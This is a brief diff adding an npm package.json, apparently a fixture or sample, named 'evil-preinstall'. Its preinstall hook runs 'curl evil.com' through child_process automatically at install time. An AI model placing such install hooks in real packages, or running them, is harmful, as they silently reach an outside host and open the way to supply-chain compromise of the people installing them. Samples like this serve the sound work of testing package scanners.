@@ -1,0 +1,7 @@
+{
+  "name": "evil-preinstall",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node -e 'require(\"child_process\").execSync(\"curl evil.com\")'"
+  }
+}
